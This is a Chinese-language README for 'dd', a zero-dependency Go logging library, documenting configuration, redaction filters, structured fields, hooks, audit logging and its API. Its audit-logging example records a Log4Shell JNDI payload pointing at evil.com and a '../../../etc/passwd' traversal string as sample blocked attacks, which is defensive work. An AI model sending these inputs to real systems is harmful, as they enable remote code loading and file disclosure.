# DD - 高性能 Go 日志库

[![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=flat&logo=go)](https://go.dev/)
[![Documentation](https://img.shields.io/badge/docs-cybergo.dev-blue.svg)](https://www.cybergo.dev/dd)
[![pkg.go.dev](https://pkg.go.dev/badge/github.com/cybergodev/dd.svg)](https://pkg.go.dev/github.com/cybergodev/dd)
[![License](https://img.shields.io/badge/license-MIT-brightgreen.svg)](LICENSE)
[![Security](https://img.shields.io/badge/security-policy-blue.svg)](SECURITY.md)

一个生产级高性能 Go 日志库，零外部依赖，专为现代云原生应用设计。

**[English Documentation](README.md)** | **[www.cybergo.dev/dd](https://www.cybergo.dev/dd)**

---

## 核心特性

| 特性 | 说明 |
|------|------|
| **高性能** | 极低分配（简单日志 1 次/操作），缓冲池复用，无锁读取 |
| **线程安全** | 原子操作 + 无锁设计，完全并发安全 |
| **内置安全** | 敏感数据过滤、注入攻击防护 |
| **结构化日志** | 类型安全字段、JSON/文本格式，可自定义字段名 |
| **智能轮转** | 按大小自动轮转、自动压缩、自动清理 |
| **零依赖** | 仅使用 Go 标准库 |
| **简单易用** | 30 秒快速上手，直观的 API |
| **云原生** | JSON 格式兼容 ELK/Splunk/CloudWatch |

---

## 安装

```bash
go get github.com/cybergodev/dd
```

**要求:** Go 1.25+

---

## 快速开始

### 30 秒上手

```go
package main

import "github.com/cybergodev/dd"

func main() {
    // 零配置 - 直接使用包级函数
    dd.Debug("调试信息")
    dd.Info("应用启动")
    dd.Warn("缓存未命中")
    dd.Error("连接失败")
    // dd.Fatal("严重错误")  // 调用 os.Exit(1)

    // 带字段的结构化日志
    dd.InfoWith("请求处理完成",
        dd.String("method", "GET"),
        dd.Int("status", 200),
        dd.Float64("duration_ms", 45.67),
    )
}
```

### 文件日志

```go
package main

import (
    "log"

    "github.com/cybergodev/dd"
)

func main() {
    // 配置文件输出与轮转
    cfg := dd.DefaultConfig()
    cfg.Targets = []dd.OutputTarget{dd.FileOutput("logs/app.log")}

    logger, err := dd.New(cfg)
    if err != nil {
        log.Fatalf("创建日志器失败: %v", err)
    }
    defer logger.Close()

    logger.Info("应用启动")
    logger.InfoWith("用户登录",
        dd.String("user_id", "12345"),
        dd.String("ip", "192.168.1.100"),
    )
}
```

---

## 配置

### 预设配置

```go
// 生产环境（默认）- Info 级别，文本格式
logger, err := dd.New(dd.DefaultConfig())

// 开发环境 - Debug 级别，带调用者信息
logger, err := dd.New(dd.DevelopmentConfig())

// 云原生 - JSON 格式，Debug 级别
logger, err := dd.New(dd.JSONConfig())
```

### 自定义配置

```go
cfg := dd.DefaultConfig()
cfg.Level = dd.LevelDebug
cfg.Format = dd.FormatJSON
cfg.DynamicCaller = true  // 显示调用者 文件:行号

// 文件输出与轮转
fileTarget := dd.FileOutput("logs/app.log")
fileTarget.MaxSizeMB = 100              // 100MB 时轮转
fileTarget.MaxBackups = 10              // 保留 10 个备份
fileTarget.MaxAge = 30 * 24 * time.Hour // 30 天后删除
fileTarget.Compress = true              // Gzip 压缩旧文件
cfg.Targets = []dd.OutputTarget{fileTarget}

logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("创建日志器失败: %v", err)
}
defer logger.Close()
```

### 输出目标

`Targets` 字段控制日志输出目标，使用辅助构造函数：

```go
cfg := dd.DefaultConfig()
cfg.Targets = []dd.OutputTarget{
    dd.ConsoleOutput(),                  // 标准输出
    dd.FileOutput("logs/app.log"),       // 带轮转的文件输出
    dd.CustomOutput(customWriter),       // 任意 io.Writer
}
logger, err := dd.New(cfg)
```

### 配置包级函数

包级函数 (`dd.Debug()`, `dd.Info()` 等) 使用默认 logger。使用 `InitDefault()` 自定义其行为：

```go
package main

import "github.com/cybergodev/dd"

func main() {
    // 配置包级函数使用的默认 logger
    cfg := dd.DefaultConfig()
    cfg.Level = dd.LevelDebug
    cfg.DynamicCaller = false  // 关闭调用者 文件:行号 输出

    if err := dd.InitDefault(cfg); err != nil {
        panic(err)
    }

    // 现在这些函数使用你的配置
    dd.Debug("调试信息")      // 无调用者信息
    dd.Info("应用启动")       // 无调用者信息

    // 重新启用调用者信息
    cfg.DynamicCaller = true
    dd.InitDefault(cfg)

    dd.Info("带调用者信息")    // 显示 文件:行号
}
```

### JSON 自定义

```go
cfg := dd.JSONConfig()
cfg.JSON.FieldNames = &dd.JSONFieldNames{
    Timestamp: "@timestamp",  // ELK 标准
    Level:     "severity",
    Message:   "msg",
    Caller:    "source",
    Fields:    "attributes",   // 自定义结构化字段名
}
cfg.JSON.PrettyPrint = true  // 开发环境美化输出

logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("创建日志器失败: %v", err)
}
```

---

## 安全特性

### 敏感数据过滤

```go
cfg := dd.DefaultConfig()
cfg.Security = dd.DefaultSecurityConfig()  // 启用基础过滤

logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("创建日志器失败: %v", err)
}

// 自动过滤（基础 — DefaultSecurityConfig）
logger.Info("password=secret123")           // -> password=[REDACTED]
logger.Info("api_key=sk-abc123")            // -> api_key=[REDACTED]
logger.Info("credit_card=4532015112830366") // -> credit_card=[REDACTED]
// 邮箱地址需要完整过滤：cfg.Security = dd.DefaultSecureConfig()
```

| 安全级别 | 过滤类型 | 覆盖范围 |
|---------|---------|---------|
| `DefaultSecurityConfig()` | 基础 | 密码、API Key、信用卡号、手机号、数据库连接串 |
| `DefaultSecureConfig()` | 完整 | 所有内置模式：JWT、AWS Key、IP 地址、SSN、邮箱等 |
| `HealthcareConfig()` | HIPAA | 完整 + PHI 模式（诊断代码、病历号） |
| `FinancialConfig()` | PCI-DSS | 完整 + 金融数据（SWIFT、IBAN、CVV、路由号） |
| `GovernmentConfig()` | 政府 | 完整 + 敏感标识（护照、驾照、案件号） |

也可使用 `SecurityConfigForLevel()` 按级别选择：

```go
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment) // 不过滤
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelBasic)       // 基础
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelStandard)    // 标准
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelStrict)      // 严格
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelParanoid)    // 最高
```

### 自定义过滤规则

```go
filter := dd.NewEmptySensitiveDataFilter()
filter.AddPatterns(
    `(?i)internal_token[:\s=]+[^\s]+`,
    `(?i)session_id[:\s=]+[^\s]+`,
)

cfg := dd.DefaultConfig()
cfg.Security = &dd.SecurityConfig{
    SensitiveFilter: filter,
}
logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("创建日志器失败: %v", err)
}
```

### 禁用安全过滤（最高性能）

```go
cfg := dd.DefaultConfig()
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment)
```

---

## 结构化日志

### 字段类型

```go
logger.InfoWith("所有字段类型",
    dd.String("user", "alice"),
    dd.Int("count", 42),
    dd.Int64("id", 9876543210),
    dd.Float64("score", 98.5),
    dd.Bool("active", true),
    dd.Time("created_at", time.Now()),
    dd.Duration("elapsed", 150*time.Millisecond),
    dd.Err(errors.New("连接失败")),
    dd.ErrWithStack(errors.New("严重错误")), // 包含堆栈信息
    dd.Any("tags", []string{"vip", "premium"}),
)
```

### 字段链式

```go
// 创建带持久字段的 logger
userLogger := logger.WithFields(
    dd.String("service", "user-api"),
    dd.String("version", "1.0.0"),
)

// 所有日志自动包含 service 和 version
userLogger.Info("用户认证成功")
userLogger.InfoWith("配置文件加载", dd.String("user_id", "123"))

// 继续链式添加字段
requestLogger := userLogger.WithFields(
    dd.String("request_id", "req-abc-123"),
)
requestLogger.Info("处理请求")
```

---

## 输出管理

### 多输出目标

```go
// 使用 Targets 同时输出到控制台和文件
cfg := dd.DefaultConfig()
cfg.Targets = []dd.OutputTarget{
    dd.ConsoleOutput(),
    dd.FileOutput("logs/app.log"),
}
logger, err := dd.New(cfg)

// 或使用 MultiWriter 实现高级场景
fileWriter, err := dd.NewFileWriter("logs/app.log", dd.DefaultFileWriterConfig())
if err != nil { /* 处理错误 */ }

multiWriter := dd.NewMultiWriter(os.Stdout, fileWriter)

cfg := dd.DefaultConfig()
cfg.Targets = []dd.OutputTarget{dd.CustomOutput(multiWriter)}
logger, err := dd.New(cfg)
```

### 缓冲写入（高吞吐场景）

```go
fileWriter, err := dd.NewFileWriter("logs/app.log", dd.DefaultFileWriterConfig())
if err != nil { /* 处理错误 */ }

bufferedWriter, err := dd.NewBufferedWriter(fileWriter, dd.DefaultBufferedWriterConfig())
if err != nil { /* 处理错误 */ }
defer bufferedWriter.Close()  // 重要: 关闭时刷新缓冲

cfg := dd.DefaultConfig()
cfg.Targets = []dd.OutputTarget{dd.CustomOutput(bufferedWriter)}
logger, err := dd.New(cfg)
```

### 动态 Writer 管理

```go
logger, err := dd.New()
if err != nil { /* 处理错误 */ }

fileWriter, err := dd.NewFileWriter("logs/dynamic.log", dd.DefaultFileWriterConfig())
if err != nil { /* 处理错误 */ }

logger.AddWriter(fileWriter)        // 运行时添加
logger.RemoveWriter(fileWriter)     // 运行时移除

fmt.Printf("Writer 数量: %d\n", logger.WriterCount())
```

---

## Context 与追踪

### Context 键

```go
ctx := context.Background()
ctx = dd.WithTraceID(ctx, "trace-abc123")
ctx = dd.WithSpanID(ctx, "span-def456")
ctx = dd.WithRequestID(ctx, "req-789xyz")

// 模式 1: 提取 context 值并传递给 WithFields
entry := logger.WithFields(
    dd.String("trace_id", dd.GetTraceID(ctx)),
    dd.String("span_id", dd.GetSpanID(ctx)),
)
entry.InfoWith("处理请求", dd.String("user", "alice"))

// 模式 2: 使用辅助函数提取
func extractTraceFields(ctx context.Context) []dd.Field {
    var fields []dd.Field
    if traceID := dd.GetTraceID(ctx); traceID != "" {
        fields = append(fields, dd.String("trace_id", traceID))
    }
    if spanID := dd.GetSpanID(ctx); spanID != "" {
        fields = append(fields, dd.String("span_id", spanID))
    }
    return fields
}

traceFields := extractTraceFields(ctx)
logger.InfoWith("用户操作", append(traceFields,
    dd.String("action", "login"),
)...)
```

> **注意:** 始终使用有效的父 context（如 `context.Background()`），不能使用 `nil`。

### 自定义 Context 提取器

```go
tenantExtractor := func(ctx context.Context) []dd.Field {
    if tenantID := ctx.Value("tenant_id"); tenantID != nil {
        return []dd.Field{dd.String("tenant_id", tenantID.(string))}
    }
    return nil
}

cfg := dd.DefaultConfig()
cfg.ContextExtractors = []dd.ContextExtractor{tenantExtractor}
logger, err := dd.New(cfg)
```

---

## 钩子（Hooks）

```go
hooks := dd.NewHooksFromConfig(dd.HooksConfig{
    BeforeLog: []dd.Hook{
        func(ctx context.Context, hctx *dd.HookContext) error {
            fmt.Printf("日志前: %s\n", hctx.Message)
            return nil
        },
    },
    AfterLog: []dd.Hook{
        func(ctx context.Context, hctx *dd.HookContext) error {
            fmt.Printf("日志后: %s\n", hctx.Message)
            return nil
        },
    },
    OnError: []dd.Hook{
        func(ctx context.Context, hctx *dd.HookContext) error {
            fmt.Printf("错误: %v\n", hctx.Error)
            return nil
        },
    },
})

cfg := dd.DefaultConfig()
cfg.Hooks = hooks
logger, err := dd.New(cfg)
```

---

## 审计日志

### 审计事件

```go
// 创建审计日志器（默认输出到 os.Stderr）
auditCfg := dd.DefaultAuditConfig()
auditCfg.JSONFormat = true

auditLogger, err := dd.NewAuditLogger(auditCfg)
if err != nil { /* 处理错误 */ }
defer auditLogger.Close()

// 记录安全事件
auditLogger.LogSensitiveDataRedaction("password=*", "password", "密码已脱敏")
auditLogger.LogPathTraversalAttempt("../../../etc/passwd", "路径遍历已阻止")
auditLogger.LogSecurityViolation("LOG4SHELL", "检测到可疑模式", map[string]any{
    "input": "${jndi:ldap://evil.com/a}",
})
```

### 日志完整性

```go
// 使用自动生成的密钥创建签名器
integrityCfg, err := dd.DefaultIntegrityConfigSafe()
if err != nil { /* 处理错误 */ }

signer, err := dd.NewIntegritySigner(integrityCfg)
if err != nil { /* 处理错误 */ }

// 签名日志消息
message := "关键审计事件"
signature := signer.Sign(message)
fmt.Printf("已签名: %s %s\n", message, signature)

// 验证签名
result, err := signer.Verify(message + " " + signature)
if err == nil && result.Valid {
    fmt.Println("签名有效")
}
```

---

## 测试

### LoggerRecorder

使用 `LoggerRecorder` 在测试中捕获和断言日志输出：

```go
recorder := dd.NewLoggerRecorder()

// 创建写入到 recorder 的 logger
logger, err := recorder.NewLogger()
if err != nil { /* 处理错误 */ }

logger.InfoWith("用户登录",
    dd.String("user_id", "123"),
    dd.String("action", "login"),
)

// 断言捕获的条目
fmt.Printf("总条目数: %d\n", recorder.Count())          // 1
fmt.Printf("有条目: %v\n", recorder.HasEntries())        // true

// 检查最后一条
entry := recorder.LastEntry()
fmt.Printf("级别: %v\n", entry.Level)      // Info
fmt.Printf("消息: %s\n", entry.Message)    // "用户登录"

// 搜索条目
recorder.ContainsMessage("用户登录")           // true
recorder.ContainsField("user_id")             // true
recorder.GetFieldValue("user_id")             // "123"
recorder.EntriesAtLevel(dd.LevelInfo)         // []LogEntry{...}
```

---

## 高级功能

### 日志采样

在高吞吐场景下减少日志量：

```go
cfg := dd.DefaultConfig()
cfg.Sampling = &dd.SamplingConfig{
    Enabled:    true,
    Initial:    100,              // 始终记录前 100 条
    Thereafter: 10,               // 之后每 10 条记录 1 条
    Tick:       time.Second,      // 每秒重置计数器
}
logger, err := dd.New(cfg)
```

### 字段验证

强制字段键的命名规范：

```go
// 严格的 snake_case 验证
logger.SetFieldValidation(dd.StrictSnakeCaseConfig())

// 自定义验证
fv := &dd.FieldValidationConfig{
    Mode:                     dd.FieldValidationStrict,
    Convention:               dd.NamingConventionSnakeCase,
    AllowCommonAbbreviations: true,
}
logger.SetFieldValidation(fv)
```

### 动态级别解析

根据运行时条件动态调整日志级别：

```go
var errorCount atomic.Int64

logger.SetLevelResolver(func(ctx context.Context) dd.LogLevel {
    if errorCount.Load() > 100 {
        return dd.LevelWarn  // 高错误率下降低日志量
    }
    return dd.LevelDebug
})
```

### 优雅关闭

使用 `Shutdown` 进行带超时的安全关闭：

```go
logger, _ := dd.New(dd.DefaultConfig())
defer func() {
    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()
    if err := logger.Shutdown(ctx); err != nil {
        fmt.Fprintf(os.Stderr, "日志器关闭错误: %v\n", err)
    }
}()
```

### 调试工具

快速数据检查（输出到 stdout，不经过安全过滤）：

```go
dd.Text(myStruct)                      // 格式化输出
dd.Textf("值: %v", data)               // 格式化文本
dd.JSON(myStruct)                      // 带调用者信息的 JSON
dd.JSONF("结果: %v", data)             // 格式化 JSON

// 也可通过 logger 实例调用
logger.Text(myStruct)
logger.JSON(myStruct)
```

---

## 性能

| 操作 | 吞吐量 | 内存/操作 | 分配次数 |
|------|--------|-----------|----------|
| 简单日志 | ~49 万/秒 | 64 B | 1 |
| 结构化日志（3 字段） | ~27 万/秒 | 241 B | 4 |
| JSON 格式 | ~29.5 万/秒 | 225 B | 3 |
| 级别检查 | ~3.6 亿/秒 | 0 B | 0 |
| 并发（22 goroutines） | ~430 万/秒 | 80 B | 1 |

> 基准使用默认配置（启用安全过滤）写入 `io.Discard`；在 Intel Core Ultra 9 上测得。  
> `内存/操作` 与 `分配次数` 为确定性数值；吞吐量随硬件变化。可用  
> `go test -bench=. -benchmem` 复现。

**优化建议:**
- 在执行昂贵操作前使用 `IsLevelEnabled()` 检查：`if logger.IsDebugEnabled() { ... }`
- 在高吞吐场景下启用缓冲写入
- 在可信环境中禁用安全过滤

---

## API 参考

### 日志级别

| 常量 | 值 | 说明 |
|------|----|------|
| `dd.LevelDebug` | 0 | 详细诊断信息 |
| `dd.LevelInfo` | 1 | 一般操作信息（默认） |
| `dd.LevelWarn` | 2 | 警告条件 |
| `dd.LevelError` | 3 | 错误条件 |
| `dd.LevelFatal` | 4 | 严重错误（调用 os.Exit(1)） |

### 包级函数

```go
// 简单日志
dd.Debug(args ...any)
dd.Info(args ...any)
dd.Warn(args ...any)
dd.Error(args ...any)
dd.Fatal(args ...any)  // 调用 os.Exit(1)

// 格式化日志
dd.Debugf(format string, args ...any)
dd.Infof(format string, args ...any)
dd.Warnf(format string, args ...any)
dd.Errorf(format string, args ...any)
dd.Fatalf(format string, args ...any)

// 结构化日志
dd.InfoWith(msg string, fields ...dd.Field)
dd.ErrorWith(msg string, fields ...dd.Field)
// ... DebugWith, WarnWith, FatalWith

// 全局 logger 管理
dd.InitDefault(cfg ...Config) error  // 使用配置初始化默认 logger
dd.SetDefault(logger *Logger)
dd.Default() *Logger                 // 获取默认 logger
dd.DefaultWithErr() (*Logger, error) // 获取默认 logger 及初始化错误
dd.DefaultInitError() error          // 检查默认初始化是否失败
dd.SetLevel(level LogLevel) error
dd.GetLevel() LogLevel

// 通用级别日志
dd.Log(level LogLevel, args ...any)
dd.Logf(level LogLevel, format string, args ...any)
dd.LogWith(level LogLevel, msg string, fields ...Field)

// 级别检查函数
dd.IsLevelEnabled(level LogLevel) bool
dd.IsDebugEnabled()  // + IsInfoEnabled, IsWarnEnabled, IsErrorEnabled, IsFatalEnabled

// Print 函数（经过安全过滤，使用 LevelInfo）
dd.Print(args ...any)
dd.Println(args ...any)
dd.Printf(format string, args ...any)

// 字段链式（包级）
dd.WithFields(fields ...Field) *LoggerEntry
dd.WithField(key string, value any) *LoggerEntry

// 采样
dd.SetSampling(config *SamplingConfig)
dd.GetSampling() *SamplingConfig

// 生命周期
dd.Flush() error
dd.AddWriter(w io.Writer) error
dd.RemoveWriter(w io.Writer) error
dd.WriterCount() int
```

### Logger 方法

```go
logger, err := dd.New()

// 简单日志
logger.Info(args ...any)
logger.Infof(format string, args ...any)
logger.InfoWith(msg string, fields ...Field)

// 通用级别日志
logger.Log(level LogLevel, args ...any)
logger.Logf(level LogLevel, format string, args ...any)
logger.LogWith(level LogLevel, msg string, fields ...Field)

// Print 方法（经过安全过滤，使用 LevelInfo）
logger.Print(args ...any)
logger.Println(args ...any)
logger.Printf(format string, args ...any)

// 级别管理
logger.SetLevel(level LogLevel) error
logger.GetLevel() LogLevel
logger.IsLevelEnabled(level LogLevel) bool
logger.IsDebugEnabled() bool    // + IsInfoEnabled, IsWarnEnabled, IsErrorEnabled, IsFatalEnabled
logger.SetLevelResolver(resolver LevelResolver)
logger.GetLevelResolver() LevelResolver

// Writer 管理
logger.AddWriter(w io.Writer) error
logger.RemoveWriter(w io.Writer) error
logger.WriterCount() int

// 生命周期
logger.Flush() error
logger.Close() error
logger.Shutdown(ctx context.Context) error  // 带超时的优雅关闭
logger.IsClosed() bool

// 字段链式
logger.WithFields(fields ...Field) *LoggerEntry
logger.WithField(key string, value any) *LoggerEntry

// 安全
logger.SetSecurityConfig(config *SecurityConfig)
logger.GetSecurityConfig() *SecurityConfig
logger.ActiveFilterGoroutines() int32
logger.WaitForFilterGoroutines(timeout time.Duration) bool

// Context 提取器
logger.AddContextExtractor(extractor ContextExtractor) error
logger.SetContextExtractors(extractors ...ContextExtractor) error
logger.GetContextExtractors() []ContextExtractor

// 钩子
logger.AddHook(event HookEvent, hook Hook) error
logger.SetHooks(registry *HookRegistry) error
logger.GetHooks() *HookRegistry

// 采样
logger.SetSampling(config *SamplingConfig)
logger.GetSampling() *SamplingConfig

// 字段验证
logger.SetFieldValidation(config *FieldValidationConfig)
logger.GetFieldValidation() *FieldValidationConfig
```

### 字段构造函数

```go
dd.String(key, value string)
dd.Int(key string, value int)
dd.Int8(key string, value int8)
dd.Int16(key string, value int16)
dd.Int32(key string, value int32)
dd.Int64(key string, value int64)
dd.Uint(key string, value uint)
dd.Uint8(key string, value uint8)
dd.Uint16(key string, value uint16)
dd.Uint32(key string, value uint32)
dd.Uint64(key string, value uint64)
dd.Float32(key string, value float32)
dd.Float64(key string, value float64)
dd.Bool(key string, value bool)
dd.Time(key string, value time.Time)
dd.Duration(key string, value time.Duration)
dd.Err(err error)                    // 错误字段（键: "error"）
dd.ErrWithKey(key string, err error) // 自定义键的错误字段
dd.ErrWithStack(err error)           // 带堆栈信息的错误
dd.Any(key string, value any)        // 任意类型
```

### 输出目标辅助函数

| 辅助函数 | 说明 |
|---------|------|
| `dd.ConsoleOutput()` | 标准输出 |
| `dd.FileOutput(path)` | 带轮转的文件输出 |
| `dd.CustomOutput(w)` | 自定义 io.Writer |

### Context 函数

```go
// 设置 context 值
dd.WithTraceID(ctx context.Context, id string) context.Context
dd.WithSpanID(ctx context.Context, id string) context.Context
dd.WithRequestID(ctx context.Context, id string) context.Context

// 获取 context 值
dd.GetTraceID(ctx context.Context) string
dd.GetSpanID(ctx context.Context) string
dd.GetRequestID(ctx context.Context) string
```

### 依赖注入接口

```go
// CoreLogger - 基础日志方法
type CoreLogger interface {
    Debug/Info/Warn/Error/Fatal(args ...any)
    Debugf/Infof/Warnf/Errorf/Fatalf(format string, args ...any)
    DebugWith/InfoWith/WarnWith/ErrorWith/FatalWith(msg string, fields ...Field)
    WithFields(fields ...Field) *LoggerEntry
    WithField(key string, value any) *LoggerEntry
}

// LevelLogger - 增加级别管理
type LevelLogger interface {
    CoreLogger
    GetLevel() LogLevel
    SetLevel(level LogLevel) error
    IsLevelEnabled(level LogLevel) bool
    IsDebugEnabled() bool  // + IsInfoEnabled, IsWarnEnabled, IsErrorEnabled, IsFatalEnabled
}

// ConfigurableLogger - 增加 Writer、生命周期和配置方法
type ConfigurableLogger interface {
    CoreLogger
    GetLevel() LogLevel
    SetLevel(level LogLevel) error
    AddWriter(writer io.Writer) error
    RemoveWriter(writer io.Writer) error
    WriterCount() int
    Flush() error
    Close() error
    IsClosed() bool
    SetSecurityConfig(config *SecurityConfig)
    GetSecurityConfig() *SecurityConfig
    SetWriteErrorHandler(handler WriteErrorHandler)
    AddContextExtractor(extractor ContextExtractor) error
    SetContextExtractors(extractors ...ContextExtractor) error
    GetContextExtractors() []ContextExtractor
    AddHook(event HookEvent, hook Hook) error
    SetHooks(registry *HookRegistry) error
    GetHooks() *HookRegistry
    SetSampling(config *SamplingConfig)
    GetSampling() *SamplingConfig
}

// LogProvider - 完整接口，用于依赖注入和测试（包含 Print/Text/JSON 调试方法）
type LogProvider interface {
    // 包含所有 CoreLogger, LevelLogger, ConfigurableLogger 方法
    // 加调试工具: Print/Println/Printf, Text/Textf, JSON/JSONF
    // 加过滤协程监控: ActiveFilterGoroutines/WaitForFilterGoroutines
}

// 在服务中使用:
type Service struct {
    logger dd.LogProvider
}
```

---

## 示例代码

查看 [examples](examples) 目录获取完整可运行示例：

| 文件 | 说明 |
|------|------|
| [01_quick_start.go](examples/01_quick_start.go) | 5 分钟快速入门 |
| [02_structured_logging.go](examples/02_structured_logging.go) | 类型安全字段，WithFields |
| [03_configuration.go](examples/03_configuration.go) | 配置 API、预设配置、轮转 |
| [04_security.go](examples/04_security.go) | 过滤、自定义规则 |
| [05_writers.go](examples/05_writers.go) | 文件、缓冲、多 Writer |
| [06_context_hooks.go](examples/06_context_hooks.go) | 追踪、钩子 |
| [07_convenience.go](examples/07_convenience.go) | 输出目标、快速配置 |
| [08_production.go](examples/08_production.go) | 生产环境模式 |
| [09_advanced.go](examples/09_advanced.go) | 采样、验证 |
| [10_audit_integrity.go](examples/10_audit_integrity.go) | 审计、完整性 |
| [11_testing.go](examples/11_testing.go) | 使用 LoggerRecorder 测试 |

使用 `examples` 构建标签运行示例：

```bash
go run -tags examples examples/01_quick_start.go
```

---

## 许可证

MIT 许可证 - 详见 [LICENSE](LICENSE) 文件。
